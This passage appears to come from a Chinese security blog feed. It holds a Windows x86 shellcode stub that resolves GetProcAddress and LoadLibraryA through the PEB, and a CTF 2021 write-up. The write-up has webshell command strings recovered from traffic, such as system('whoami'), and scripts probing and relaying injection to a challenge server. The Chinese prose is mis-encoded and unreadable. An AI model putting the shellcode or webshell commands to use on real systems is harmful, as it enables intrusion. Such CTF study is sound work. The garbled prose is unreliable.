class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">    xor ecx, ecx</span><br><span class="line">    mov eax, fs: [ecx + 0x30] </span><br><span class="line">    mov eax, [eax + 0xc]</span><br><span class="line">    mov esi, [eax + 0x14]</span><br><span class="line">    lodsd</span><br><span class="line">    xchg eax, esi</span><br><span class="line">    lodsd</span><br><span class="line">    mov ebx, [eax + 0x10]</span><br><span class="line">    push ebx</span><br><span class="line">    mov edx, [ebx + 0x3c]</span><br><span class="line">    add edx, ebx</span><br><span class="line">    mov edx, [edx + 0x78]</span><br><span class="line">    add edx, ebx</span><br><span class="line">    mov esi, [edx + 0x20]</span><br><span class="line">    add esi, ebx</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">Get_Function_GetProcAddress:</span><br><span class="line">    inc ecx</span><br><span class="line">    lodsd</span><br><span class="line">    add eax, ebx</span><br><span class="line">    cmp dword ptr[eax], 0x50746547</span><br><span class="line">    jnz Get_Function_GetProcAddress</span><br><span class="line">    cmp dword ptr[eax + 0x4], 0x41636f72</span><br><span class="line">    jnz Get_Function_GetProcAddress</span><br><span class="line">    cmp dword ptr[eax + 0x8], 0x65726464</span><br><span class="line">    jnz Get_Function_GetProcAddress</span><br><span class="line">    mov esi, [edx + 0x24]</span><br><span class="line">    add esi, ebx</span><br><span class="line">    mov cx, [esi + ecx * 2]</span><br><span class="line">    dec ecx</span><br><span class="line">    mov esi, [edx + 0x1c]</span><br><span class="line">    add esi, ebx</span><br><span class="line">    mov edx, [esi + ecx * 4]</span><br><span class="line">    add edx, ebx</span><br><span class="line"></span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    push edx</span><br><span class="line">    push ecx</span><br><span class="line">    push 0x41797261</span><br><span class="line">    push 0x7262694c</span><br><span class="line">    push 0x64616f4c</span><br><span class="line">    push esp</span><br><span class="line">    push ebx</span><br><span class="line">    call edx</span><br><span class="line"></span><br><span class="line">    add esp, 0x10</span><br><span class="line">    push eax</span><br><span class="line">    xor ecx,ecx</span><br><span class="line">    push ecx</span><br><span class="line">    mov cx, 0x6c6c; ll</span><br><span class="line">    push ecx</span><br><span class="line">    push 0x642e7472</span><br><span class="line">    push 0x6376736d</span><br><span class="line">    push esp</span><br><span class="line">    call eax;</span><br><span class="line">    add esp, 0x10;</span><br><span class="line"></span><br><span class="line">    ;è¿™é‡Œå¡«å…¥æƒ³è¦æ‰§è¡Œçš„ä¸€äº›shellcodeï¼Œè¿™æ—¶å€™GetProcAddresså’ŒLoadLibraryAéƒ½åœ¨æ ˆä¸Šï¼Œéƒ½å¯ä¾›è°ƒç”¨ã€‚</span><br><span class="line">    ;esp LoadLibraryA_addr</span><br><span class="line">    ;esp+4 GetProcAddress</span><br><span class="line">    ;esp+8 Kernel32.dll</span><br><span class="line"></span><br><span class="line">    add esp, 0x8</span><br><span class="line">    pop edx</span><br><span class="line">    pop ebx</span><br><span class="line">    mov ecx, 0x61737365</span><br><span class="line">    push ecx</span><br><span class="line">    sub dword ptr[esp + 0x3], 0x61</span><br><span class="line">    push 0x636f7250</span><br><span class="line">    push 0x74697845</span><br><span class="line">    push esp</span><br><span class="line">    push ebx</span><br><span class="line">    call edx</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    push ecx</span><br><span class="line">    call eax</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><p>å› ä¸ºæƒ³ç€å¦‚æœç”¨è°ƒè¯•å™¨å»æˆªå–shellcodeå¾ˆéº»çƒ¦ï¼Œç„¶åè‡ªå·±ç”¨c++å†™äº†ä¸ªå°ç¨‹åºï¼Œç”¨nasmæ¥æŠŠæ±‡ç¼–ä»£ç ç¼–è¯‘æˆæœºå™¨ç ï¼Œå®é™…æ•ˆæœï¼š</p><p>åœ¨_asmæ–‡ä»¶ä¸­æ”¾å…¥æˆ‘ä»¬å†™å¥½çš„shellcodeï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥æŒ‡å®šå…¶ä»–æ–‡ä»¶åï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/424431700.png"></p><p>ç„¶åæ‰§è¡Œç¨‹åº asm_shellcode.exe  æ–‡ä»¶å  ä½æ•°ï¼ˆå¯ä¸æŒ‡å®šï¼Œé»˜è®¤32ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/84300700.png"></p><p>ä½†æ˜¯æœ‰ä¸€ç‚¹å¾—æ³¨æ„mov eax, fs: [ecx + 0x30] ä¼šç¼–è¯‘å‡ºé”™ï¼Œå¿…é¡»å¾—æ”¹æˆmov eax, [fs: ecx + 0x30] æ‰è¡Œï¼Œç„¶åå°è¯•åŠ è½½shellcodeæ‰§è¡Œ</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/177087977.png"></p><p>è¿™é‡Œå°±åº”è¯¥å·®ä¸å¤šäº†ï¼Œä¸€è·¯å¥—å¨ƒå°±è¡Œäº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SXCCTF 2021</title>
      <link href="2021/02/21/2021SXCCTF/"/>
      <url>2021/02/21/2021SXCCTF/</url>
      
        <content type="html"><![CDATA[<h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><blockquote><p><a href="http://106.55.249.213/">http://106.55.249.213</a>:5002/<br>ç¥å„ä½å¤§ä½¬ï¼Œå¤§å¤§ä½¬ï¼Œæ–°æ˜¥å¿«ä¹ï¼<br>2021 æ›´åŠ ç‰›13ï¼ï¼ï¼</p></blockquote><p>flagåœ¨çŸ­ç‰‡ä¸­ï¼šflag{Happy_New_Year_2021}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2208079998.png"></p><h5 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h5><h2 id="Flagä¸åœ¨è¿™"><a href="#Flagä¸åœ¨è¿™" class="headerlink" title="Flagä¸åœ¨è¿™"></a>Flagä¸åœ¨è¿™</h2><blockquote><p>FlagçœŸçš„ä¸åœ¨è¿™ï¼Œä½ è¦ç›¸ä¿¡æˆ‘ï¼ŒçŸ¥é“å—ï¼</p></blockquote><p>æ‰“å¼€æ˜¾ç¤º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flagä¸åœ¨è¿™ï¼</span><br></pre></td></tr></table></figure><p>äºæ˜¯æ”¾å…¥010å‘ç°æ˜¯ä¸ªå‹ç¼©åŒ…ï¼Œæ‰“å¼€å‘ç°flag.txtï¼šflag{Itâ€™s_real_easy!D0_Y0u_Like_it?}</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/2526981304.png"></p><h2 id="ç‰›å¹´å¤§å‰"><a href="#ç‰›å¹´å¤§å‰" class="headerlink" title="ç‰›å¹´å¤§å‰"></a>ç‰›å¹´å¤§å‰</h2><blockquote><p>è¦ç›¸ä¿¡è‡ªå·±ï¼Œä»–å°±æ˜¯flagï¼</p></blockquote><p>æŸ¥çœ‹å±æ€§å‘ç°flagï¼šflag{è¿™ä¸ªå°±æ˜¯å“¦!}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4097658638.png"></p><h2 id="ç½‘ç»œæ·±å¤„"><a href="#ç½‘ç»œæ·±å¤„" class="headerlink" title="ç½‘ç»œæ·±å¤„"></a>ç½‘ç»œæ·±å¤„</h2><blockquote><p>ç½‘ç»œæ·±å¤„! åƒä¸‡ä¸è¦ä¸€ä¸ªäººå¤§æ™šä¸Šåšå“¦ï¼ï¼ï¼</p></blockquote><p>åŸé¢˜å°±ä¸å†™äº†.æ»‘ç¨½.jpg</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.harvey.plus&#x2F;index.php&#x2F;Writeup&#x2F;2020UNCTF-%E5%85%AC%E5%BC%80%E8%B5%9B.html#%E7%BD%91%E7%BB%9C%E6%B7%B1%E5%A4%841</span><br></pre></td></tr></table></figure><h2 id="æ‹¼å›¾"><a href="#æ‹¼å›¾" class="headerlink" title="æ‹¼å›¾"></a>æ‹¼å›¾</h2><blockquote><p>ä½ ä¹Ÿå–œæ¬¢é¬¼åˆ€å—ï¼Ÿ</p></blockquote><p>montageåˆæˆ + gapså¯¹å¤§å›¾é—ä¼ ç®—æ³•è§£æ‹¼å›¾<br>â‘ .<a href="https://download.imagemagick.org/ImageMagick/download/binaries/ImageMagick-7.0.11-0-Q16-HDRI-x64-dll.exe">montage</a>ï¼ˆWindowsï¼‰ï¼ˆPSï¼šå°†å…¶æ”¹ä¸º1200X1200ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">montage &quot;D:\Harvey\èµ›é¢˜\SXCCTF\æ‚é¡¹\zip\æ‹¼å›¾\*.png&quot; -tile 10x10 -geometry +0+0 result.png</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/3446728363.png"></p><p>â‘¡.gapsï¼ˆkaliï¼‰è§£å¾—flagï¼šflag{123A4X5b6cLi}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">å®‰è£…å‘½ä»¤</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;nemanja-m&#x2F;gaps.git</span><br><span class="line">cd gaps</span><br><span class="line">sudo python3 setup.py install</span><br><span class="line">æ‹¼å›¾å‘½ä»¤</span><br><span class="line">gaps --image&#x3D;&#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;result.png --generation&#x3D;30 --population&#x3D;300 --size&#x3D;120</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/2116207182.png"></p><h2 id="Very-very-easy-hex"><a href="#Very-very-easy-hex" class="headerlink" title="Very very easy hex"></a>Very very easy hex</h2><blockquote><p>Very very easy hex!! Enjoy it!!!</p></blockquote><p>å¥—å¨ƒè§£å‹ç¼©åŒ…ï¼Œå…ˆå†™ä¸ªå¾ªç¯è§£å‹çš„è„šæœ¬è§£å‡º168å¼ å›¾<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2739945018.png"></p><p>é™„ä¸Šè„šæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">zipname &#x3D; &quot;img.zip&quot;</span><br><span class="line">while True:</span><br><span class="line">    ts1 &#x3D; zipfile.ZipFile(zipname)</span><br><span class="line">    ts1.extractall(&quot;.&#x2F;&quot;)</span><br><span class="line">    zipname &#x3D; &quot;.&#x2F;&quot;+ts1.namelist()[0]</span><br></pre></td></tr></table></figure><p>è§£æ³•ä¸€ï¼šèœé¸¡åšæ³•</p><p>æ¥ç€å‘ç°è¿™äº›å›¾ç‰‡hexå°± 04083A00 å’Œ 012040D0 ä¸¤ç§æ ¼å¼</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/116661158497.png"></p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/2561853733.png"></p><p>äºæ˜¯å°†å…¶åˆ†åˆ«æ ‡æ³¨ä¸º0/1å¾—åˆ°å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">011001100110110001100001011001110111101101000100001100000101111101111001001100000111010101011111011011000110100101101011011001010101111101101001011101000011111101111101</span><br></pre></td></tr></table></figure><p>æœ€åè½¬æˆå­—ç¬¦ä¸²å¾—åˆ°flagï¼šflag{D0_y0u_like_it?}<br><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/4286024290.png"></p><p>è§£æ³•äºŒï¼šå¤§ä½¬åªéœ€ä¸€ä¸ªè„šæœ¬æ¢­å“ˆQAQ</p><p>è·‘ä¸‹è„šæœ¬å¾—åˆ°flagï¼šflag{D0_y0u_like_it?}</p><p>é™„ä¸Šè„šæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line">binstr&#x3D;&#39;&#39;</span><br><span class="line">for i in range(168):</span><br><span class="line">    img&#x3D;Image.open(str(i)+&#39;.png&#39;)</span><br><span class="line">    char&#x3D;img.getpixel((0,0))</span><br><span class="line">    if char&#x3D;&#x3D;(0, 0, 0, 255):</span><br><span class="line">        binstr+&#x3D;&#39;0&#39;</span><br><span class="line">    else:</span><br><span class="line">        binstr+&#x3D;&#39;1&#39;</span><br><span class="line">    if len(binstr)&gt;&#x3D;8:</span><br><span class="line">        print(chr(int(binstr,2)),end&#x3D;&#39;&#39;)</span><br><span class="line">        binstr&#x3D;&#39;&#39;</span><br></pre></td></tr></table></figure><h2 id="YLBNB"><a href="#YLBNB" class="headerlink" title="YLBNB"></a>YLBNB</h2><blockquote><p>ä½ ä¼šå–œæ¬¢ä»–çš„! :)</p></blockquote><p>åŸé¢˜by <a href="https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2020UNCTF#toc-heading-56">UNCTF2020-YLBç»å¯†æ–‡ä»¶</a><br>ä¸ä¼šå¤ç°.jpg</p><h2 id="Love-it"><a href="#Love-it" class="headerlink" title="Love_it!"></a>Love_it!</h2><blockquote><p>æ–‡ä»¶è¾ƒå¤§ï¼Œé€‰æ‹©ç½‘ç›˜ä¸‹è½½(æ‰‹åŠ¨ç‹—å¤´)<br>è“å¥ï¼š<a href="https://wws.lanzous.com/iy5T6lf343g">https://wws.lanzous.com/iy5T6lf343g</a> å¯†ç :gbmf<br>ç™¾åº¦äº‘ï¼šé“¾æ¥: <a href="https://pan.baidu.com/s/1wT3bVls2X_5bOSBaxBK91A">https://pan.baidu.com/s/1wT3bVls2X_5bOSBaxBK91A</a> æå–ç : ufrs å¤åˆ¶è¿™æ®µå†…å®¹åæ‰“å¼€ç™¾åº¦ç½‘ç›˜æ‰‹æœºAppï¼Œæ“ä½œæ›´æ–¹ä¾¿å“¦</p><p>è§£å‹å¯†ç ä¸ºï¼š2021_jia_you!!<br>flag ä¸º flag{åå°åç§°_åå°è´¦å·_åå°å¯†ç _ä¸€å¥è¯æœ¨é©¬åç§°_ä¸€å¥è¯å¯†ç _ç¬¬ä¸‰ä¸ªé©¬å­æ‰§è¡Œçš„å‘½ä»¤}<br>ä¾‹å¦‚ï¼š<br>åå°ç½‘å€ä¸º:<br><a href="http://127.0.0.1/admin/index.php">http://127.0.0.1/admin/index.php</a> åå°åç§°å°±ä¸º: admin<br>è´¦å·ä¸ºï¼š2021 åå°è´¦å·ä¸º: 2021<br>å¯†ç ä¸ºï¼šhappy_new_year! åå°å¯†ç ä¸º: happy_new_year!<br>ä¸€å¥è¯æœ¨é©¬è·¯å¾„ä¸º: <a href="http://127.0.0.1/mu.php">http://127.0.0.1/mu.php</a> ä¸€å¥è¯æœ¨é©¬åç§°ä¸º: mu<br>ä¸€å¥è¯æœ¨é©¬ ä¸€å¥è¯å¯†ç ä¸º: starsnow<br>ä¸€å¥è¯æ‰§è¡Œçš„å‘½ä»¤<br>è¿æ¥é©¬å­ ä¹‹åæ‰§è¡Œçš„ç¬¬ä¸‰æ¡ å‘½ä»¤<br>ç¬¬ä¸€æ¡ yingzi=phpinfo();<br>ç¬¬äºŒæ¡ yingzi=system(â€˜whoamiâ€™);<br>ç¬¬ä¸‰æ¡ yingzi=system(â€˜lsâ€™); ç¬¬ä¸‰ä¸ªé©¬å­æ‰§è¡Œçš„å‘½ä»¤ï¼š system(â€˜lsâ€™);</p><p>ä¾‹å¦‚ï¼š<br>flag{admin_2021_happy_new_year!_starsnow_system(â€˜lsâ€™);}</p></blockquote><p>ç”±é¢˜å¯çŸ¥æµé‡é‡Œé¢æœ‰ä¼ é©¬<br>äºæ˜¯åœ¨ç­›é€‰httpä¸‹è¿›è¡Œæœé›†é¢˜ç›®æ‰€è¦æ±‚çš„ä¿¡æ¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åå°åï¼šdedeï¼›åå°è´¦å·ï¼šadminï¼›å¯†ç ï¼šstarsnowniubi</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/1628581112.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä¸€å¥è¯æœ¨é©¬åç§°ï¼šma</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/945581305.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä¸€å¥è¯å¯†ç ï¼šyingziï¼›ç¬¬ä¸‰ä¸ªé©¬å­æ‰§è¡Œçš„å‘½ä»¤ï¼šecho &#96;whoami&#96;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/2893776143.png"><br>æœ€ç»ˆæ•´åˆå¾—åˆ°flagï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;dede_admin_starsnowniubi_ma_yingzi_echo &#96;whoami&#96;;&#125;                  </span><br></pre></td></tr></table></figure><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="base"><a href="#base" class="headerlink" title="base"></a>base</h2><blockquote><p>106.55.249.213:5001<br>BaseBaseBase<br>ä½ é‡è§è¿‡æ¸—é€ä¸­ä¼ è¾“å€¼ä¸ºåŠ å¯†çš„å˜›ï¼Ÿ</p></blockquote><p>æ‰“å¼€é“¾æ¥å‘ç°ä»–è¿˜å¸¦æœ‰å‚æ•°åé¢ï¼Œå†æ ¹æ®é¢˜ç›®ä¿¡æ¯ï¼Œäºæ˜¯æˆ‘å°è¯•äº†å„ç§baseï¼Œæ— æœ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;106.55.249.213:5001?user&#x3D;QgcAYAbgbw&#x2F;</span><br><span class="line"></span><br><span class="line">Sorry,you are not admin!you are Guest</span><br></pre></td></tr></table></figure><p>æœ€åè¯•äº†è¯•robots.txtå‘ç°äº†ä¸ªbase.txt</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/985128690.png"></p><p>æ¥ç€å°†å…¶ä¿å­˜ä¸‹æ¥ï¼Œç»„åˆæˆä¸€ä¸ªå­—å…¸å¾—åˆ°admin=XAXwaAZAaQ</p><p>é™„ä¸Šè„šæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">res&#x3D;&quot;&#123;&quot;</span><br><span class="line">with open(&quot;base.txt&quot;, &#39;r&#39;) as f:</span><br><span class="line">    a &#x3D; f.readlines()</span><br><span class="line">    for i in a:</span><br><span class="line">        tmp  &#x3D; i.strip(&quot;\n&quot;)</span><br><span class="line">        url &#x3D; &#39;http:&#x2F;&#x2F;106.55.249.213:5001&#x2F;?user&#x3D;&#39;+tmp</span><br><span class="line">        # print(url)</span><br><span class="line">        r &#x3D; requests.get(url)</span><br><span class="line">        z &#x3D; r.text[32:]</span><br><span class="line">        if z!&#x3D;&#39;&#39;:</span><br><span class="line">            k &#x3D; f&#39;&quot;&#123;z&#125;&quot;:&quot;&#123;tmp&#125;&quot;,&#39;</span><br><span class="line">        res +&#x3D; k</span><br><span class="line">res&#x3D;res[:-1]</span><br><span class="line">res+&#x3D;&quot;&#125;&quot;</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/3344035626.png"></p><p>ç»å¤§ä½¬æŒ‡ç‚¹å¾—çŸ¥éœ€è¦æ•´ä¸ªflaskè„šæœ¬å®ç°ä¸­è½¬æ³¨å…¥</p><p>é™„ä¸Šè„šæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from flask import Flask,request</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line">a &#x3D; &#123;&quot; &quot;: &quot;CA&quot;, &quot;!&quot;: &quot;HA&quot;, &quot;&quot;: &quot;HQ&quot;, &quot;#&quot;: &quot;Hg&quot;, &quot;$&quot;: &quot;Hw&quot;, &quot;%&quot;: &quot;IA&quot;, &quot;&amp;&quot;: &quot;IQ&quot;, &quot;&#39;&quot;: &quot;Ig&quot;, &quot;(&quot;: &quot;Iw&quot;, &quot;)&quot;: &quot;JA&quot;,</span><br><span class="line">     &quot;*&quot;: &quot;JQ&quot;, &quot;+&quot;: &quot;Jg&quot;, &quot;,&quot;: &quot;Jw&quot;, &quot;-&quot;: &quot;KA&quot;, &quot;.&quot;: &quot;KQ&quot;, &quot;&#x2F;&quot;: &quot;Kg&quot;, &quot;0&quot;: &quot;Kw&quot;, &quot;1&quot;: &quot;LA&quot;, &quot;2&quot;: &quot;LQ&quot;, &quot;3&quot;: &quot;Lg&quot;,</span><br><span class="line">     &quot;4&quot;: &quot;Lw&quot;, &quot;5&quot;: &quot;MA&quot;, &quot;6&quot;: &quot;MQ&quot;, &quot;7&quot;: &quot;Mg&quot;, &quot;8&quot;: &quot;Mw&quot;, &quot;9&quot;: &quot;NA&quot;, &quot;:&quot;: &quot;NQ&quot;, &quot;;&quot;: &quot;Ng&quot;, &quot;&lt;&quot;: &quot;Nw&quot;, &quot;&#x3D;&quot;: &quot;OA&quot;,</span><br><span class="line">     &quot;&gt;&quot;: &quot;OQ&quot;, &quot;?&quot;: &quot;Og&quot;, &quot;@&quot;: &quot;Ow&quot;, &quot;A&quot;: &quot;PA&quot;, &quot;B&quot;: &quot;PQ&quot;, &quot;C&quot;: &quot;Pg&quot;, &quot;D&quot;: &quot;Pw&quot;, &quot;E&quot;: &quot;QA&quot;, &quot;F&quot;: &quot;QQ&quot;, &quot;G&quot;: &quot;Qg&quot;,</span><br><span class="line">     &quot;H&quot;: &quot;Qw&quot;, &quot;I&quot;: &quot;RA&quot;, &quot;J&quot;: &quot;RQ&quot;, &quot;K&quot;: &quot;Rg&quot;, &quot;L&quot;: &quot;Rw&quot;, &quot;M&quot;: &quot;SA&quot;, &quot;N&quot;: &quot;SQ&quot;, &quot;O&quot;: &quot;Sg&quot;, &quot;P&quot;: &quot;Sw&quot;, &quot;Q&quot;: &quot;TA&quot;,</span><br><span class="line">     &quot;R&quot;: &quot;TQ&quot;, &quot;S&quot;: &quot;Tg&quot;, &quot;T&quot;: &quot;Tw&quot;, &quot;U&quot;: &quot;UA&quot;, &quot;V&quot;: &quot;UQ&quot;, &quot;W&quot;: &quot;Ug&quot;, &quot;X&quot;: &quot;Uw&quot;, &quot;Y&quot;: &quot;VA&quot;, &quot;Z&quot;: &quot;VQ&quot;, &quot;[&quot;: &quot;Vg&quot;,</span><br><span class="line">     &quot;\\&quot;: &quot;Vw&quot;, &quot;]&quot;: &quot;WA&quot;, &quot;^&quot;: &quot;WQ&quot;, &quot;_&quot;: &quot;Wg&quot;, &quot;&#96;&quot;: &quot;Ww&quot;, &quot;a&quot;: &quot;XA&quot;, &quot;b&quot;: &quot;XQ&quot;, &quot;c&quot;: &quot;Xg&quot;, &quot;d&quot;: &quot;Xw&quot;, &quot;e&quot;: &quot;YA&quot;,</span><br><span class="line">     &quot;f&quot;: &quot;YQ&quot;, &quot;g&quot;: &quot;Yg&quot;, &quot;h&quot;: &quot;Yw&quot;, &quot;i&quot;: &quot;ZA&quot;, &quot;j&quot;: &quot;ZQ&quot;, &quot;k&quot;: &quot;Zg&quot;, &quot;l&quot;: &quot;Zw&quot;, &quot;m&quot;: &quot;aA&quot;, &quot;n&quot;: &quot;aQ&quot;, &quot;o&quot;: &quot;ag&quot;,</span><br><span class="line">     &quot;p&quot;: &quot;aw&quot;, &quot;q&quot;: &quot;bA&quot;, &quot;r&quot;: &quot;bQ&quot;, &quot;s&quot;: &quot;bg&quot;, &quot;t&quot;: &quot;bw&quot;, &quot;u&quot;: &quot;cA&quot;, &quot;v&quot;: &quot;cQ&quot;, &quot;w&quot;: &quot;cg&quot;, &quot;x&quot;: &quot;cw&quot;, &quot;y&quot;: &quot;dA&quot;,</span><br><span class="line">     &quot;z&quot;: &quot;dQ&quot;, &quot;&#123;&quot;: &quot;dg&quot;, &quot;|&quot;: &quot;dw&quot;, &quot;&#125;&quot;: &quot;eA&quot;, &quot;~&quot;: &quot;eQ&quot;, &quot;&quot;: &quot;eg&quot;, &quot;è™&quot;: &quot;ew&quot;, &quot;è›&quot;: &quot;fA&quot;, &quot;èœ&quot;: &quot;fQ&quot;, &quot;è&quot;: &quot;fg&quot;,</span><br><span class="line">     &quot;è&quot;: &quot;fw&quot;, &quot;èŸ&quot;: &quot;gA&quot;, &quot;è &quot;: &quot;gQ&quot;, &quot;è¡&quot;: &quot;gg&quot;, &quot;è¢&quot;: &quot;gw&quot;, &quot;è£&quot;: &quot;hA&quot;, &quot;è¤&quot;: &quot;hQ&quot;, &quot;è¥&quot;: &quot;hg&quot;, &quot;è¦&quot;: &quot;hw&quot;, &quot;è§&quot;: &quot;iA&quot;,</span><br><span class="line">     &quot;è¨&quot;: &quot;iQ&quot;, &quot;è«&quot;: &quot;ig&quot;, &quot;è¬&quot;: &quot;iw&quot;, &quot;è­&quot;: &quot;jA&quot;, &quot;è®&quot;: &quot;jQ&quot;, &quot;è¯&quot;: &quot;jg&quot;, &quot;è°&quot;: &quot;jw&quot;, &quot;è²&quot;: &quot;kA&quot;, &quot;è³&quot;: &quot;kQ&quot;, &quot;è´&quot;: &quot;kg&quot;,</span><br><span class="line">     &quot;èµ&quot;: &quot;kw&quot;, &quot;è¶&quot;: &quot;lA&quot;, &quot;è·&quot;: &quot;lQ&quot;, &quot;è¸&quot;: &quot;lg&quot;, &quot;è¹&quot;: &quot;lw&quot;, &quot;èº&quot;: &quot;mA&quot;, &quot;è»&quot;: &quot;mQ&quot;, &quot;è¼&quot;: 